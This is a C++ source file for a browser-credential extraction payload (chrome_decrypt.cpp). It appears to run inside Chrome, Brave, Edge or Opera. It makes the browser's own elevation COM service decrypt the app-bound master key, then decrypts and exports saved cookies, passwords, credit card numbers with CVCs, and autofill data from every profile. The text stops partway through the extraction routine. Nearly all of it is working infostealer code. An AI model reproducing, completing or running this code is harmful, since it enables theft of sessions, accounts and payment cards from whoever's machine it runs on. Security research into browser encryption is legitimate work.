// chrome_decrypt.cpp
// v0.15.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

// Removed: #include "reflective_loader.h"

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>

// VSS includes
#include <vss.h>
#include <VsWriter.h>
// Forward declaration to avoid including VsWriter.h which breaks on some toolchains
#ifndef VSS_COMPONENT_TYPE
enum VSS_COMPONENT_TYPE;
#endif
#ifndef __IVssWMFiledesc_FWD_DEFINED__
interface IVssWMFiledesc;
#endif
#ifndef __IVssWMDependency_FWD_DEFINED__
interface IVssWMDependency;
#endif
#ifndef VSS_USAGE_TYPE
enum VSS_USAGE_TYPE;
#endif
#ifndef VSS_RESTOREMETHOD_ENUM
enum VSS_RESTOREMETHOD_ENUM;
#endif
#ifndef VSS_FILE_RESTORE_STATUS
enum VSS_FILE_RESTORE_STATUS;
#endif
#ifndef __IVssWriterComponents_FWD_DEFINED__
interface IVssWriterComponents;
#endif
#include <VsBackup.h>
#include <comdef.h>

#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <functional>
#include <any>
#include <unordered_map>
#include <set>

#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "VssApi.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace Payload
{
    class PipeLogger;

    namespace Utils
    {
        fs::path GetLocalAppDataPath()
        {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
            {
                fs::path result = path;
                CoTaskMemFree(path);
                return result;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        // Added: Roaming AppData path for Opera
        fs::path GetAppDataPath()
        {
            wchar_t path[MAX_PATH] = {0};
            if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, path)))
            {
                return fs::path(path);
            }
            throw std::runtime_error("Failed to get APPDATA path");
        }

        std::optional<std::vector<uint8_t>> Base64Decode(const std::string &input)
        {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
                return std::nullopt;
            std::vector<uint8_t> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
                return std::nullopt;
            return data;
        }

        std::string BytesToHexString(const std::vector<uint8_t> &bytes)
        {
            std::ostringstream oss;
            oss << std::hex << std::setfill('0');
            for (uint8_t byte : bytes)
                oss << std::setw(2) << static_cast<int>(byte);
            return oss.str();
        }

        std::string EscapeJson(const std::string &s)
        {
            std::ostringstream o;
            for (char c : s)
            {
                switch (c)
                {
                case '"':
                    o << "\\\"";
                    break;
                case '\\':
                    o << "\\\\";
                    break;
                case '\b':
                    o << "\\b";
                    break;
                case '\f':
                    o << "\\f";
                    break;
                case '\n':
                    o << "\\n";
                    break;
                case '\r':
                    o << "\\r";
                    break;
                case '\t':
                    o << "\\t";
                    break;
                default:
                    if ('\x00' <= c && c <= '\x1f')
                    {
                        o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                    }
                    else
                    {
                        o << c;
                    }
                }
            }
            return o.str();
        }
    }

    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        const std::unordered_map<std::string, Config> &GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data"}}};
            return browser_configs;
        }

        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto &configs = GetConfigs();
            if (processName == "chrome.exe")
                return configs.at("chrome");
            if (processName == "brave.exe")
                return configs.at("brave");
            if (processName == "msedge.exe")
                return configs.at("edge");
            if (processName == "opera.exe")
            {
                // Prefer deciding based on the launched executable path when both flavors are installed
                try
                {
                    std::string exePathLower(exePath);
                    std::transform(exePathLower.begin(), exePathLower.end(), exePathLower.begin(), ::tolower);
                    if (exePathLower.find("opera gx") != std::string::npos)
                    {
                        return {"Opera GX", L"opera.exe", CLSID_NULL, IID_NULL, fs::path("Opera Software") / "Opera GX Stable"};
                    }
                    if (exePathLower.find("\\opera\\") != std::string::npos)
                    {
                        return {"Opera", L"opera.exe", CLSID_NULL, IID_NULL, fs::path("Opera Software") / "Opera Stable"};
                    }
                }
                catch (...)
                {
                }

                // Detect Opera flavor by checking Roaming profiles as a fallback
                try
                {
                    fs::path base = Utils::GetAppDataPath() / "Opera Software";
                    fs::path gx = base / "Opera GX Stable";
                    fs::path std = base / "Opera Stable";
                    if (fs::exists(gx))
                    {
                        return {"Opera GX", L"opera.exe", CLSID_NULL, IID_NULL, fs::path("Opera Software") / "Opera GX Stable"};
                    }
                    if (fs::exists(std))
                    {
                        return {"Opera", L"opera.exe", CLSID_NULL, IID_NULL, fs::path("Opera Software") / "Opera Stable"};
                    }
                }
                catch (...)
                {
                }
                // Fallback: default to Opera Stable
                return {"Opera", L"opera.exe", CLSID_NULL, IID_NULL, fs::path("Opera Software") / "Opera Stable"};
            }

            throw std::runtime_error("Unsupported host process: " + processName);
        }
    }

    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        const std::string V20_PREFIX = "v20";
        const std::string V10_PREFIX = "v10"; // Added: support Chromium v10 blobs

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t> &key, const std::vector<uint8_t> &blob)
        {
            const size_t min_overhead_v20 = V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;
            const size_t min_overhead_v10 = V10_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;

            bool is_v20 = blob.size() >= min_overhead_v20 && memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) == 0;
            bool is_v10 = !is_v20 && blob.size() >= min_overhead_v10 && memcmp(blob.data(), V10_PREFIX.c_str(), V10_PREFIX.length()) == 0;
            if (!is_v20 && !is_v10)
            {
                return {};
            }

            size_t prefix_len = is_v20 ? V20_PREFIX.length() : V10_PREFIX.length();

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
            auto algCloser = [](BCRYPT_ALG_HANDLE h)
            { if(h) BCryptCloseAlgorithmProvider(h,0); };
            std::unique_ptr<void, decltype(algCloser)> algGuard(hAlg, algCloser);

            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCRYPT_KEY_HANDLE hKey = nullptr;
            BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
            auto keyCloser = [](BCRYPT_KEY_HANDLE h)
            { if(h) BCryptDestroyKey(h); };
            std::unique_ptr<void, decltype(keyCloser)> keyGuard(hKey, keyCloser);

            const uint8_t *iv = blob.data() + prefix_len;
            const uint8_t *ct = iv + GCM_IV_LENGTH;
            const uint8_t *tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - prefix_len - GCM_IV_LENGTH - GCM_TAG_LENGTH);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PUCHAR)iv;
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = (PUCHAR)tag;
            authInfo.cbTag = GCM_TAG_LENGTH;

            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            try
            {
                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
                if (!NT_SUCCESS(status))
                {
                    return {};
                }
            }
            catch (...)
            {
                return {};
            }

            plain.resize(outLen);
            return plain;
        }

        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path &localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            const std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("app_bound_encrypted_key not found.");

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed app_bound_encrypted_key.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of key failed.");

            auto &decodedData = *optDecoded;
            if (decodedData.size() < sizeof(KEY_PREFIX) || memcmp(decodedData.data(), KEY_PREFIX, sizeof(KEY_PREFIX)) != 0)
            {
                throw std::runtime_error("Key prefix validation failed.");
            }
            return {decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end()};
        }

        std::vector<uint8_t> GetDpapiMasterKey(const fs::path &localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            // Opera's Local State may include other fields within os_crypt before encrypted_key,
            // so search for the key name directly instead of a strict object layout.
            const std::string tag = "\"encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("encrypted_key not found.");
            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed encrypted_key entry.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of DPAPI key failed.");

            auto &decodedData = *optDecoded;
            const char DPAPI_PREFIX[] = "DPAPI";
            if (decodedData.size() <= sizeof(DPAPI_PREFIX) - 1 || memcmp(decodedData.data(), DPAPI_PREFIX, sizeof(DPAPI_PREFIX) - 1) != 0)
                throw std::runtime_error("DPAPI key prefix missing.");

            DATA_BLOB in{};
            in.pbData = (BYTE *)(decodedData.data() + (sizeof(DPAPI_PREFIX) - 1));
            in.cbData = (DWORD)(decodedData.size() - (sizeof(DPAPI_PREFIX) - 1));
            DATA_BLOB out{};
            if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
            {
                return {};
            }
            std::vector<uint8_t> aesKey(out.pbData, out.pbData + out.cbData);
            if (out.pbData)
                LocalFree(out.pbData);
            return aesKey;
        }

        // Added: DPAPI per-blob fallback for very old formats
        std::vector<uint8_t> TryDpapiDecrypt(const uint8_t *data, size_t len)
        {
            if (!data || len == 0)
                return {};
            DATA_BLOB in{};
            in.pbData = const_cast<BYTE *>(reinterpret_cast<const BYTE *>(data));
            in.cbData = static_cast<DWORD>(len);
            DATA_BLOB out{};
            if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
            {
                return {};
            }
            std::vector<uint8_t> plain(out.pbData, out.pbData + out.cbData);
            if (out.pbData)
                LocalFree(out.pbData);
            return plain;
        }
    }

    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
            std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
        };

        const std::vector<ExtractionConfig> &GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 6));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         size_t blob_len = static_cast<size_t>(sqlite3_column_bytes(stmt, 6));
                         bool isV20 = blob_len >= 3 && memcmp(blob, "v20", 3) == 0;
                         bool isV10 = (!isV20) && blob_len >= 3 && memcmp(blob, "v10", 3) == 0;

                         std::vector<uint8_t> plain = Crypto::DecryptGcm(key, {blob, blob + blob_len});
                         if (plain.empty())
                         {
                             // DPAPI fallback for very old cookies
                             plain = Crypto::TryDpapiDecrypt(blob, blob_len);
                             if (plain.empty())
                                 return std::nullopt;
                         }

                         const char *value_start = reinterpret_cast<const char *>(plain.data());
                         size_t value_size = plain.size();

                         if (isV20 || isV10)
                         {
                             if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                                 return std::nullopt;
                             value_start += COOKIE_PLAINTEXT_HEADER_SIZE;
                             value_size -= COOKIE_PLAINTEXT_HEADER_SIZE;
                         }
                         // For DPAPI, no header skip

                         // Build Netscape cookie format line:
                         // <domain>\t<flag>\t<path>\t<secure>\t<expiration>\t<name>\t<value>
                         const char *domain_c = (const char *)sqlite3_column_text(stmt, 0);
                         const char *name_c = (const char *)sqlite3_column_text(stmt, 1);
                         const char *path_c = (const char *)sqlite3_column_text(stmt, 2);
                         std::string domain = domain_c ? domain_c : "";
                         std::string name = name_c ? name_c : "";
                         std::string path = path_c ? path_c : "/";
                         std::string flag = (!domain.empty() && domain[0] == '.') ? "TRUE" : "FALSE";
                         std::string secure = sqlite3_column_int(stmt, 3) ? "TRUE" : "FALSE";

                         // Convert Chrome expires_utc (microseconds since 1601-01-01) to Unix epoch seconds
                         long long expires_utc = sqlite3_column_int64(stmt, 5);
                         long long unix_exp = 0;
                         if (expires_utc > 0)
                         {
                             // avoid overflow: divide first
                             long long secs = expires_utc / 1000000LL;
                             const long long EPOCH_DIFFERENCE = 11644473600LL; // seconds between 1601 and 1970
                             if (secs > EPOCH_DIFFERENCE)
                                 unix_exp = secs - EPOCH_DIFFERENCE;
                         }

                         std::string value(value_start, value_size);

                         std::ostringstream netscape_line;
                         netscape_line << domain << "\t" << flag << "\t" << path << "\t" << secure
                                       << "\t" << unix_exp << "\t" << name << "\t" << value;
                         return netscape_line.str();
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         size_t blob_len = static_cast<size_t>(sqlite3_column_bytes(stmt, 2));
                         std::vector<uint8_t> plain = Crypto::DecryptGcm(key, {blob, blob + blob_len});
                         if (plain.empty())
                         {
                             // DPAPI fallback for very old passwords
                             plain = Crypto::TryDpapiDecrypt(blob, blob_len);
                             if (plain.empty()) return std::nullopt;
                         }
                         const char *url_c = (const char *)sqlite3_column_text(stmt, 0);
                         const char *user_c = (const char *)sqlite3_column_text(stmt, 1);
                         std::string url = url_c ? url_c : "";
                         std::string user = user_c ? user_c : "";
                         std::string pass((char *)plain.data(), plain.size());
                         auto sanitize = [](std::string &s){ for(char &c: s){ if(c=='\t'||c=='\r'||c=='\n') c=' '; } };
                         sanitize(url); sanitize(user); sanitize(pass);
                         return url + "\t" + user + "\t" + pass;
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                         return cvcMap;
                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return cvcMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string card_num_str, cvc_str;
                     try
                     {
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
                         if (blob)
                         {
                             size_t blob_len = static_cast<size_t>(sqlite3_column_bytes(stmt, 4));
                             auto plain = Crypto::DecryptGcm(key, {blob, blob + blob_len});
                             if (plain.empty())
                             {
                                 // DPAPI fallback for very old Opera/Chromium variants
                                 plain = Crypto::TryDpapiDecrypt(blob, blob_len);
                             }
                             card_num_str.assign((char *)plain.data(), plain.size());
                         }
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && cvcMap->count(guid))
                         {
                             const auto &cvcBlob = cvcMap->at(guid);
                             auto plain = Crypto::DecryptGcm(key, cvcBlob);
                             if (plain.empty())
                             {
                                 // DPAPI fallback for very old Opera/Chromium variants
                                 plain = Crypto::TryDpapiDecrypt(cvcBlob.data(), cvcBlob.size());
                             }
                             cvc_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                     }
                     const char *name_c = (const char *)sqlite3_column_text(stmt, 1);
                     std::string name = name_c ? name_c : "";
                     int exp_m = sqlite3_column_int(stmt, 2);
                     int exp_y = sqlite3_column_int(stmt, 3);
                     auto sanitize = [](std::string &s){ for(char &c: s){ if(c=='\t'||c=='\r'||c=='\n') c=' '; } };
                     sanitize(name); sanitize(card_num_str); sanitize(cvc_str);
                     return name + "\t" + std::to_string(exp_m) + "\t" + std::to_string(exp_y) + "\t" + card_num_str + "\t" + cvc_str;
                 }},
                // New: Autofill form entries (name/value) from Web Data -> autofill table
                {"Web Data", "autofill", "SELECT name, value FROM autofill;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     try
                     {
                         const char *name = (const char *)sqlite3_column_text(stmt, 0);
                         const char *value = (const char *)sqlite3_column_text(stmt, 1);
                         if (!name && !value) return std::nullopt;
                         std::string name_s = name ? name : "";
                         std::string value_s = value ? value : "";
                         auto sanitize = [](std::string &s){ for(char &c: s){ if(c=='\t'||c=='\r'||c=='\n') c=' '; } };
                         sanitize(name_s); sanitize(value_s);
                         return name_s + "\t" + value_s;
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }}
            };
            return configs;
        }
    }

    class PipeLogger
    {
    public:
        PipeLogger(LPCWSTR pipeName)
        {
            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }

        ~PipeLogger()
        {
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                FlushFileBuffers(m_pipe);
                CloseHandle(m_pipe);
            }
        }

        bool isValid() const
        {
            return m_pipe != INVALID_HANDLE_VALUE;
        }

        void Log(const std::string &message)
        {
            if (isValid())
            {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
            }
        }

        HANDLE getHandle() const
        {
            return m_pipe;
        }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
    };

    class BrowserManager
    {
    public:
        BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

        const Browser::Config &getConfig() const
        {
            return m_config;
        }
        const fs::path getUserDataRoot() const
        {
            if (m_config.processName == L"opera.exe")
            {
                return Utils::GetAppDataPath() / m_config.userDataSubPath;
            }
            return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
        }

    private:
        Browser::Config m_config;
    };

    class MasterKeyDecryptor
    {
    public:
        MasterKeyDecryptor(PipeLogger &logger) : m_logger(logger)
        {
            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
            {
                throw std::runtime_error("Failed to initialize COM library.");
            }
            m_comInitialized = true;
            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
        }

        ~MasterKeyDecryptor()
        {
            if (m_comInitialized)
            {
                CoUninitialize();
            }
        }

        std::vector<uint8_t> Decrypt(const Browser::Config &config, const fs::path &localStatePath)
        {
            m_logger.Log("[*] Reading Local State file: " + localStatePath.u8string());

            // Opera/Opera GX: use DPAPI path (v10-style master key)
            if (config.processName == L"opera.exe")
            {
                auto aesKey = Crypto::GetDpapiMasterKey(localStatePath);
                if (aesKey.size() != Crypto::KEY_SIZE)
                {
                    throw std::runtime_error("DPAPI master key length invalid.");
                }
                return aesKey;
            }

            // ABE path for Chrome/Brave/Edge
            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
            if (!bstrEncKey)
                throw std::runtime_error("SysAllocStringByteLen for encrypted key failed.");
            auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);

            BSTR bstrPlainKey = nullptr;
            auto bstrPlainGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(nullptr, &SysFreeString);

            HRESULT hr = E_FAIL;
            DWORD comErr = 0;

            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
            if (config.name == "Edge")
            {
                Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }
            else
            {
                Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }
            bstrPlainGuard.reset(bstrPlainKey);

            if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
            {
                std::ostringstream oss;
                oss << "IElevator->DecryptData failed. HRESULT: 0x" << std::hex << hr;
                throw std::runtime_error(oss.str());
            }

            std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
            memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
            return aesKey;
        }

    private:
        PipeLogger &m_logger;
        bool m_comInitialized = false;
    };

    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(const fs::path &userDataRoot, PipeLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}

        std::vector<fs::path> FindProfiles()
        {
            m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
            std::set<fs::path> uniqueProfilePaths;

            auto isProfileDirectory = [](const fs::path &path)
            {
                // Consider modern and legacy cookie DB locations, plus other data DBs
                if (fs::exists(path / "Network" / "Cookies") || fs::exists(path / "Cookies"))
                    return true;
                if (fs::exists(path / "Login Data") || fs::exists(path / "Web Data"))
                    return true;
                return false;
            };

            if (isProfileDirectory(m_userDataRoot))
            {
                uniqueProfilePaths.insert(m_userDataRoot);
            }

            try
            {
                for (const auto &entry : fs::directory_iterator(m_userDataRoot))
                {
                    if (entry.is_directory() && isProfileDirectory(entry.path()))
                    {
                        uniqueProfilePaths.insert(entry.path());
                    }
                }
            }
            catch (const fs::filesystem_error &ex)
            {
                m_logger.Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
            }

            m_logger.Log("[+] Found " + std::to_string(uniqueProfilePaths.size()) + " profile(s).");
            return std::vector<fs::path>(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
        }

    private:
        fs::path m_userDataRoot;
        PipeLogger &m_logger;
    };

    class DataExtractor
    {
    public:
        DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
                      const fs::path &baseOutputPath, const std::string &browserName)
            : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}

        void Extract()
        {
            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
            if (!fs::exists(dbPath))
            {
                // Fallback: some Chromium-based browsers (incl. Opera/Opera GX on certain versions)
                // store Cookies DB at the profile root as "Cookies" instead of "Network/Cookies".
                if (m_config.dbRelativePath == (fs::path("Network") / "Cookies"))
                {
                    fs::path altPath = m_profilePath / "Cookies";
                    if (fs::exists(altPath))
                    {
                        dbPath = altPath;
                    }
                    else
                    {
                        return;
                    }
                }
                else
                {
                    return;
                }
            }

            // Helper RAII to cleanup temporary copy if we create one
            struct TempCopyCleanup {
                bool active = false;
                fs::path dir;
                ~TempCopyCleanup(){ if (active) { std::error_code ec; fs::remove_all(dir, ec); } }
            } tempCleanup;

            sqlite3 *db = nullptr;
            // Try opening directly first with read-only, immutable, and no-lock hints
            std::string uriPath = "file:" + dbPath.string() + "?mode=ro&immutable=1&nolock=1";
